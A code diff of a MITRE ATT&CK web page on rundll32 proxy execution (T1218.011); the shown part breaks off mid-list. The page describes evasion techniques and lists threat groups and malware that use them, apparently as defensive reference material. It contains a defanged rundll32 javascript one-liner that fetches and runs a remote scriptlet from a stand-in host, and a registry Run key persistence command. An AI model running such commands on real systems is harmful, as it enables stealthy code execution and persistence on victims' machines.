@@ -19,11 +19,10 @@
         <title>System Binary Proxy Execution: Rundll32, Sub-technique T1218.011 - Enterprise | MITRE ATT&CK&reg;</title>
         <!-- Bootstrap CSS -->
         <link rel='stylesheet' href="/versions/v14/theme/style/bootstrap.min.css" />
-        <link rel='stylesheet' href="/versions/v14/theme/style/bootstrap-glyphicon.min.css" />
         <link rel='stylesheet' href="/versions/v14/theme/style/bootstrap-tourist.css" />
         <link rel='stylesheet' href="/versions/v14/theme/style/bootstrap-select.min.css" />
-        <link rel="stylesheet" type="text/css" href="/versions/v14/theme/style.min.css?d548d7ba">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+        <link rel="stylesheet" type="text/css" href="/versions/v14/theme/style.min.css?dfd3be17">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
 </head>
 
@@ -341,7 +340,7 @@
    
 
                                     <div class="description-body">
-                                                <p>Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. <a href="/versions/v14/techniques/T1129">Shared Modules</a>), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).</p><p>Rundll32.exe can also be used to execute <a href="/versions/v14/techniques/T1218/002">Control Panel</a> Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. <span onclick=scrollToRef('scite-1') id="scite-ref-1-a" class="scite-citeref-number" data-reference="Trend Micro CPL"><sup><a href="https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf" target="_blank" data-hasqtip="0" aria-describedby="qtip-0">[1]</a></sup></span></p><p>Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. <span onclick=scrollToRef('scite-2') id="scite-ref-2-a" class="scite-citeref-number" data-reference="This is Security Command Line Confusion"><sup><a href="https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/" target="_blank" data-hasqtip="1" aria-describedby="qtip-1">[2]</a></sup></span></p><p>Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.<span onclick=scrollToRef('scite-3') id="scite-ref-3-a" class="scite-citeref-number" data-reference="Attackify Rundll32.exe Obscurity"><sup><a href="https://www.attackify.com/blog/rundll32_execution_order/" target="_blank" data-hasqtip="2" aria-describedby="qtip-2">[3]</a></sup></span><span onclick=scrollToRef('scite-4') id="scite-ref-4-a" class="scite-citeref-number" data-reference="Github NoRunDll"><sup><a href="https://github.com/gtworek/PSBits/tree/master/NoRunDll" target="_blank" data-hasqtip="3" aria-describedby="qtip-3">[4]</a></sup></span> DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).</p><p>Additionally, adversaries may use <a href="/versions/v14/techniques/T1036">Masquerading</a> techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.<span onclick=scrollToRef('scite-5') id="scite-ref-5-a" class="scite-citeref-number" data-reference="rundll32.exe defense evasion"><sup><a href="https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/" target="_blank" data-hasqtip="4" aria-describedby="qtip-4">[5]</a></sup></span> </p>
+                                                <p>Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. <a href="/versions/v14/techniques/T1129">Shared Modules</a>), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).</p><p>Rundll32.exe can also be used to execute <a href="/versions/v14/techniques/T1218/002">Control Panel</a> Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. <span onclick=scrollToRef('scite-1') id="scite-ref-1-a" class="scite-citeref-number" title="Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017."data-reference="Trend Micro CPL"><sup><a href="https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf" target="_blank" data-hasqtip="0" aria-describedby="qtip-0">[1]</a></sup></span></p><p>Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. <span onclick=scrollToRef('scite-2') id="scite-ref-2-a" class="scite-citeref-number" title="B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018."data-reference="This is Security Command Line Confusion"><sup><a href="https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/" target="_blank" data-hasqtip="1" aria-describedby="qtip-1">[2]</a></sup></span></p><p>Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.<span onclick=scrollToRef('scite-3') id="scite-ref-3-a" class="scite-citeref-number" title="Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021."data-reference="Attackify Rundll32.exe Obscurity"><sup><a href="https://www.attackify.com/blog/rundll32_execution_order/" target="_blank" data-hasqtip="2" aria-describedby="qtip-2">[3]</a></sup></span><span onclick=scrollToRef('scite-4') id="scite-ref-4-a" class="scite-citeref-number" title="gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021."data-reference="Github NoRunDll"><sup><a href="https://github.com/gtworek/PSBits/tree/master/NoRunDll" target="_blank" data-hasqtip="3" aria-describedby="qtip-3">[4]</a></sup></span> DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).</p><p>Additionally, adversaries may use <a href="/versions/v14/techniques/T1036">Masquerading</a> techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.<span onclick=scrollToRef('scite-5') id="scite-ref-5-a" class="scite-citeref-number" title="Ariel silver. (2022, February 1). Defense Evasion Techniques. Retrieved April 8, 2022."data-reference="rundll32.exe defense evasion"><sup><a href="https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/" target="_blank" data-hasqtip="4" aria-describedby="qtip-4">[5]</a></sup></span> </p>
 
                                     </div>
                             </div>
@@ -449,7 +448,7 @@
                                                 <a href="/versions/v14/campaigns/C0028"> 2015 Ukraine Electric Power Attack </a>
                                             </td>
                                             <td>
-                                                            <p>During the <a href="https://attack.mitre.org/campaigns/C0028">2015 Ukraine Electric Power Attack</a>, <a href="/versions/v14/groups/G0034">Sandworm Team</a> used a backdoor which could execute a supplied DLL using <code>rundll32.exe</code>. <span onclick=scrollToRef('scite-6') id="scite-ref-6-a" class="scite-citeref-number" data-reference="Booz Allen Hamilton"><sup><a href="https://www.boozallen.com/content/dam/boozallen/documents/2016/09/ukraine-report-when-the-lights-went-out.pdf" target="_blank" data-hasqtip="5" aria-describedby="qtip-5">[6]</a></sup></span></p>
+                                                            <p>During the <a href="https://attack.mitre.org/campaigns/C0028">2015 Ukraine Electric Power Attack</a>, <a href="/versions/v14/groups/G0034">Sandworm Team</a> used a backdoor which could execute a supplied DLL using <code>rundll32.exe</code>. <span onclick=scrollToRef('scite-6') id="scite-ref-6-a" class="scite-citeref-number" title="Booz Allen Hamilton   When The Lights Went Out Retrieved. 2019/10/22 "data-reference="Booz Allen Hamilton"><sup><a href="https://www.boozallen.com/content/dam/boozallen/documents/2016/09/ukraine-report-when-the-lights-went-out.pdf" target="_blank" data-hasqtip="5" aria-describedby="qtip-5">[6]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -461,7 +460,7 @@
                                                 <a href="/versions/v14/software/S0045"> ADVSTORESHELL </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0045">ADVSTORESHELL</a> has used rundll32.exe in a Registry value to establish persistence.<span onclick=scrollToRef('scite-7') id="scite-ref-7-a" class="scite-citeref-number" data-reference="Bitdefender APT28 Dec 2015"><sup><a href="https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf" target="_blank" data-hasqtip="6" aria-describedby="qtip-6">[7]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0045">ADVSTORESHELL</a> has used rundll32.exe in a Registry value to establish persistence.<span onclick=scrollToRef('scite-7') id="scite-ref-7-a" class="scite-citeref-number" title="Bitdefender. (2015, December). APT28 Under the Scope. Retrieved February 23, 2017."data-reference="Bitdefender APT28 Dec 2015"><sup><a href="https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf" target="_blank" data-hasqtip="6" aria-describedby="qtip-6">[7]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -473,7 +472,7 @@
                                                 <a href="/versions/v14/groups/G0073"> APT19 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0073">APT19</a> configured its payload to inject into the rundll32.exe.<span onclick=scrollToRef('scite-8') id="scite-ref-8-a" class="scite-citeref-number" data-reference="FireEye APT19"><sup><a href="https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html" target="_blank" data-hasqtip="7" aria-describedby="qtip-7">[8]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0073">APT19</a> configured its payload to inject into the rundll32.exe.<span onclick=scrollToRef('scite-8') id="scite-ref-8-a" class="scite-citeref-number" title="Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018."data-reference="FireEye APT19"><sup><a href="https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html" target="_blank" data-hasqtip="7" aria-describedby="qtip-7">[8]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -485,7 +484,7 @@
                                                 <a href="/versions/v14/groups/G0007"> APT28 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0007">APT28</a> executed <a href="/versions/v14/software/S0023">CHOPSTICK</a> by using rundll32 commands such as <code>rundll32.exe "C:\Windows\twain_64.dll"</code>. <a href="/versions/v14/groups/G0007">APT28</a> also executed a .dll for a first stage dropper using rundll32.exe. An <a href="/versions/v14/groups/G0007">APT28</a> loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.<span onclick=scrollToRef('scite-9') id="scite-ref-9-a" class="scite-citeref-number" data-reference="Crowdstrike DNC June 2016"><sup><a href="https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/" target="_blank" data-hasqtip="8" aria-describedby="qtip-8">[9]</a></sup></span><span onclick=scrollToRef('scite-7') id="scite-ref-7-a" class="scite-citeref-number" data-reference="Bitdefender APT28 Dec 2015"><sup><a href="https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf" target="_blank" data-hasqtip="6" aria-describedby="qtip-6">[7]</a></sup></span><span onclick=scrollToRef('scite-10') id="scite-ref-10-a" class="scite-citeref-number" data-reference="Palo Alto Sofacy 06-2018"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/" target="_blank" data-hasqtip="9" aria-describedby="qtip-9">[10]</a></sup></span><span onclick=scrollToRef('scite-11') id="scite-ref-11-a" class="scite-citeref-number" data-reference="Unit 42 Playbook Dec 2017"><sup><a href="https://pan-unit42.github.io/playbook_viewer/" target="_blank" data-hasqtip="10" aria-describedby="qtip-10">[11]</a></sup></span><span onclick=scrollToRef('scite-12') id="scite-ref-12-a" class="scite-citeref-number" data-reference="ESET Zebrocy May 2019"><sup><a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/" target="_blank" data-hasqtip="11" aria-describedby="qtip-11">[12]</a></sup></span><span onclick=scrollToRef('scite-13') id="scite-ref-13-a" class="scite-citeref-number" data-reference="Cybersecurity Advisory GRU Brute Force Campaign July 2021"><sup><a href="https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF" target="_blank" data-hasqtip="12" aria-describedby="qtip-12">[13]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0007">APT28</a> executed <a href="/versions/v14/software/S0023">CHOPSTICK</a> by using rundll32 commands such as <code>rundll32.exe "C:\Windows\twain_64.dll"</code>. <a href="/versions/v14/groups/G0007">APT28</a> also executed a .dll for a first stage dropper using rundll32.exe. An <a href="/versions/v14/groups/G0007">APT28</a> loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.<span onclick=scrollToRef('scite-9') id="scite-ref-9-a" class="scite-citeref-number" title="Alperovitch, D.. (2016, June 15). Bears in the Midst: Intrusion into the Democratic National Committee. Retrieved August 3, 2016."data-reference="Crowdstrike DNC June 2016"><sup><a href="https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/" target="_blank" data-hasqtip="8" aria-describedby="qtip-8">[9]</a></sup></span><span onclick=scrollToRef('scite-7') id="scite-ref-7-a" class="scite-citeref-number" title="Bitdefender. (2015, December). APT28 Under the Scope. Retrieved February 23, 2017."data-reference="Bitdefender APT28 Dec 2015"><sup><a href="https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf" target="_blank" data-hasqtip="6" aria-describedby="qtip-6">[7]</a></sup></span><span onclick=scrollToRef('scite-10') id="scite-ref-10-a" class="scite-citeref-number" title="Lee, B., Falcone, R. (2018, June 06). Sofacy Group’s Parallel Attacks. Retrieved June 18, 2018."data-reference="Palo Alto Sofacy 06-2018"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/" target="_blank" data-hasqtip="9" aria-describedby="qtip-9">[10]</a></sup></span><span onclick=scrollToRef('scite-11') id="scite-ref-11-a" class="scite-citeref-number" title="Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017."data-reference="Unit 42 Playbook Dec 2017"><sup><a href="https://pan-unit42.github.io/playbook_viewer/" target="_blank" data-hasqtip="10" aria-describedby="qtip-10">[11]</a></sup></span><span onclick=scrollToRef('scite-12') id="scite-ref-12-a" class="scite-citeref-number" title="ESET Research. (2019, May 22). A journey to Zebrocy land. Retrieved June 20, 2019."data-reference="ESET Zebrocy May 2019"><sup><a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/" target="_blank" data-hasqtip="11" aria-describedby="qtip-11">[12]</a></sup></span><span onclick=scrollToRef('scite-13') id="scite-ref-13-a" class="scite-citeref-number" title="NSA, CISA, FBI, NCSC. (2021, July). Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments. Retrieved July 26, 2021."data-reference="Cybersecurity Advisory GRU Brute Force Campaign July 2021"><sup><a href="https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF" target="_blank" data-hasqtip="12" aria-describedby="qtip-12">[13]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -497,7 +496,7 @@
                                                 <a href="/versions/v14/groups/G0022"> APT3 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0022">APT3</a> has a tool that can run DLLs.<span onclick=scrollToRef('scite-14') id="scite-ref-14-a" class="scite-citeref-number" data-reference="FireEye Clandestine Fox"><sup><a href="https://www.fireeye.com/blog/threat-research/2014/04/new-zero-day-exploit-targeting-internet-explorer-versions-9-through-11-identified-in-targeted-attacks.html" target="_blank" data-hasqtip="13" aria-describedby="qtip-13">[14]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0022">APT3</a> has a tool that can run DLLs.<span onclick=scrollToRef('scite-14') id="scite-ref-14-a" class="scite-citeref-number" title="Chen, X., Scott, M., Caselden, D.. (2014, April 26). New Zero-Day Exploit targeting Internet Explorer Versions 9 through 11 Identified in Targeted Attacks. Retrieved January 14, 2016."data-reference="FireEye Clandestine Fox"><sup><a href="https://www.fireeye.com/blog/threat-research/2014/04/new-zero-day-exploit-targeting-internet-explorer-versions-9-through-11-identified-in-targeted-attacks.html" target="_blank" data-hasqtip="13" aria-describedby="qtip-13">[14]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -509,7 +508,7 @@
                                                 <a href="/versions/v14/groups/G0050"> APT32 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0050">APT32</a> malware has used rundll32.exe to execute an initial infection process.<span onclick=scrollToRef('scite-15') id="scite-ref-15-a" class="scite-citeref-number" data-reference="Cybereason Cobalt Kitty 2017"><sup><a href="https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf" target="_blank" data-hasqtip="14" aria-describedby="qtip-14">[15]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0050">APT32</a> malware has used rundll32.exe to execute an initial infection process.<span onclick=scrollToRef('scite-15') id="scite-ref-15-a" class="scite-citeref-number" title="Dahan, A. (2017). Operation Cobalt Kitty. Retrieved December 27, 2018."data-reference="Cybereason Cobalt Kitty 2017"><sup><a href="https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf" target="_blank" data-hasqtip="14" aria-describedby="qtip-14">[15]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -521,7 +520,7 @@
                                                 <a href="/versions/v14/groups/G0082"> APT38 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0082">APT38</a> has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.<span onclick=scrollToRef('scite-16') id="scite-ref-16-a" class="scite-citeref-number" data-reference="CISA AA20-239A BeagleBoyz August 2020"><sup><a href="https://us-cert.cisa.gov/ncas/alerts/aa20-239a" target="_blank" data-hasqtip="15" aria-describedby="qtip-15">[16]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0082">APT38</a> has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.<span onclick=scrollToRef('scite-16') id="scite-ref-16-a" class="scite-citeref-number" title="DHS/CISA. (2020, August 26). FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks. Retrieved September 29, 2021."data-reference="CISA AA20-239A BeagleBoyz August 2020"><sup><a href="https://us-cert.cisa.gov/ncas/alerts/aa20-239a" target="_blank" data-hasqtip="15" aria-describedby="qtip-15">[16]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -533,7 +532,7 @@
                                                 <a href="/versions/v14/groups/G0096"> APT41 </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0096">APT41</a> has used rundll32.exe to execute a loader.<span onclick=scrollToRef('scite-17') id="scite-ref-17-a" class="scite-citeref-number" data-reference="Crowdstrike GTR2020 Mar 2020"><sup><a href="https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf" target="_blank" data-hasqtip="16" aria-describedby="qtip-16">[17]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0096">APT41</a> has used rundll32.exe to execute a loader.<span onclick=scrollToRef('scite-17') id="scite-ref-17-a" class="scite-citeref-number" title="Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020."data-reference="Crowdstrike GTR2020 Mar 2020"><sup><a href="https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf" target="_blank" data-hasqtip="16" aria-describedby="qtip-16">[17]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -545,7 +544,7 @@
                                                 <a href="/versions/v14/software/S0438"> Attor </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0438">Attor</a>'s installer plugin can schedule rundll32.exe to load the dispatcher.<span onclick=scrollToRef('scite-18') id="scite-ref-18-a" class="scite-citeref-number" data-reference="ESET Attor Oct 2019"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Attor.pdf" target="_blank" data-hasqtip="17" aria-describedby="qtip-17">[18]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0438">Attor</a>'s installer plugin can schedule rundll32.exe to load the dispatcher.<span onclick=scrollToRef('scite-18') id="scite-ref-18-a" class="scite-citeref-number" title="Hromcova, Z. (2019, October). AT COMMANDS, TOR-BASED COMMUNICATIONS: MEET ATTOR, A FANTASY CREATURE AND ALSO A SPY PLATFORM. Retrieved May 6, 2020."data-reference="ESET Attor Oct 2019"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Attor.pdf" target="_blank" data-hasqtip="17" aria-describedby="qtip-17">[18]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -557,7 +556,7 @@
                                                 <a href="/versions/v14/software/S0093"> Backdoor.Oldrea </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0093">Backdoor.Oldrea</a> can use rundll32 for execution on compromised hosts.<span onclick=scrollToRef('scite-19') id="scite-ref-19-a" class="scite-citeref-number" data-reference="Gigamon Berserk Bear October 2021"><sup><a href="https://vblocalhost.com/uploads/VB2021-Slowik.pdf" target="_blank" data-hasqtip="18" aria-describedby="qtip-18">[19]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0093">Backdoor.Oldrea</a> can use rundll32 for execution on compromised hosts.<span onclick=scrollToRef('scite-19') id="scite-ref-19-a" class="scite-citeref-number" title="Slowik, J. (2021, October). THE BAFFLING BERSERK BEAR: A DECADE’S ACTIVITY TARGETING CRITICAL INFRASTRUCTURE. Retrieved December 6, 2021."data-reference="Gigamon Berserk Bear October 2021"><sup><a href="https://vblocalhost.com/uploads/VB2021-Slowik.pdf" target="_blank" data-hasqtip="18" aria-describedby="qtip-18">[19]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -569,7 +568,7 @@
                                                 <a href="/versions/v14/software/S0606"> Bad Rabbit </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0606">Bad Rabbit</a> has used rundll32 to launch a malicious DLL as <code>C:Windowsinfpub.dat</code>.<span onclick=scrollToRef('scite-20') id="scite-ref-20-a" class="scite-citeref-number" data-reference="Secure List Bad Rabbit"><sup><a href="https://securelist.com/bad-rabbit-ransomware/82851/" target="_blank" data-hasqtip="19" aria-describedby="qtip-19">[20]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0606">Bad Rabbit</a> has used rundll32 to launch a malicious DLL as <code>C:Windowsinfpub.dat</code>.<span onclick=scrollToRef('scite-20') id="scite-ref-20-a" class="scite-citeref-number" title="Mamedov, O. Sinitsyn, F.  Ivanov, A.. (2017, October 24). Bad Rabbit ransomware. Retrieved January 28, 2021."data-reference="Secure List Bad Rabbit"><sup><a href="https://securelist.com/bad-rabbit-ransomware/82851/" target="_blank" data-hasqtip="19" aria-describedby="qtip-19">[20]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -581,7 +580,7 @@
                                                 <a href="/versions/v14/software/S0268"> Bisonal </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0268">Bisonal</a> has used rundll32.exe to execute as part of the Registry Run key it adds: <code>HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\"vert" = "rundll32.exe c:\windows\temp\pvcu.dll , Qszdez"</code>.<span onclick=scrollToRef('scite-21') id="scite-ref-21-a" class="scite-citeref-number" data-reference="Unit 42 Bisonal July 2018"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/07/unit42-bisonal-malware-used-attacks-russia-south-korea/" target="_blank" data-hasqtip="20" aria-describedby="qtip-20">[21]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0268">Bisonal</a> has used rundll32.exe to execute as part of the Registry Run key it adds: <code>HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\"vert" = "rundll32.exe c:\windows\temp\pvcu.dll , Qszdez"</code>.<span onclick=scrollToRef('scite-21') id="scite-ref-21-a" class="scite-citeref-number" title="Hayashi, K., Ray, V. (2018, July 31). Bisonal Malware Used in Attacks Against Russia and South Korea. Retrieved August 7, 2018."data-reference="Unit 42 Bisonal July 2018"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/07/unit42-bisonal-malware-used-attacks-russia-south-korea/" target="_blank" data-hasqtip="20" aria-describedby="qtip-20">[21]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -593,7 +592,7 @@
                                                 <a href="/versions/v14/software/S0520"> BLINDINGCAN </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0520">BLINDINGCAN</a> has used Rundll32 to load a malicious DLL.<span onclick=scrollToRef('scite-22') id="scite-ref-22-a" class="scite-citeref-number" data-reference="US-CERT BLINDINGCAN Aug 2020"><sup><a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a" target="_blank" data-hasqtip="21" aria-describedby="qtip-21">[22]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0520">BLINDINGCAN</a> has used Rundll32 to load a malicious DLL.<span onclick=scrollToRef('scite-22') id="scite-ref-22-a" class="scite-citeref-number" title="US-CERT. (2020, August 19). MAR-10295134-1.v1 – North Korean Remote Access Trojan: BLINDINGCAN. Retrieved August 19, 2020."data-reference="US-CERT BLINDINGCAN Aug 2020"><sup><a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a" target="_blank" data-hasqtip="21" aria-describedby="qtip-21">[22]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -605,7 +604,7 @@
                                                 <a href="/versions/v14/groups/G0108"> Blue Mockingbird </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0108">Blue Mockingbird</a> has executed custom-compiled XMRIG miner DLLs using rundll32.exe.<span onclick=scrollToRef('scite-23') id="scite-ref-23-a" class="scite-citeref-number" data-reference="RedCanary Mockingbird May 2020"><sup><a href="https://redcanary.com/blog/blue-mockingbird-cryptominer/" target="_blank" data-hasqtip="22" aria-describedby="qtip-22">[23]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0108">Blue Mockingbird</a> has executed custom-compiled XMRIG miner DLLs using rundll32.exe.<span onclick=scrollToRef('scite-23') id="scite-ref-23-a" class="scite-citeref-number" title="Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020."data-reference="RedCanary Mockingbird May 2020"><sup><a href="https://redcanary.com/blog/blue-mockingbird-cryptominer/" target="_blank" data-hasqtip="22" aria-describedby="qtip-22">[23]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -617,7 +616,7 @@
                                                 <a href="/versions/v14/software/S0635"> BoomBox </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0635">BoomBox</a> can use RunDLL32 for execution.<span onclick=scrollToRef('scite-24') id="scite-ref-24-a" class="scite-citeref-number" data-reference="MSTIC Nobelium Toolset May 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/" target="_blank" data-hasqtip="23" aria-describedby="qtip-23">[24]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0635">BoomBox</a> can use RunDLL32 for execution.<span onclick=scrollToRef('scite-24') id="scite-ref-24-a" class="scite-citeref-number" title="MSTIC. (2021, May 28). Breaking down NOBELIUM’s latest early-stage toolset. Retrieved August 4, 2021."data-reference="MSTIC Nobelium Toolset May 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/" target="_blank" data-hasqtip="23" aria-describedby="qtip-23">[24]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -629,7 +628,7 @@
                                                 <a href="/versions/v14/software/S0204"> Briba </a>
                                             </td>
                                             <td>
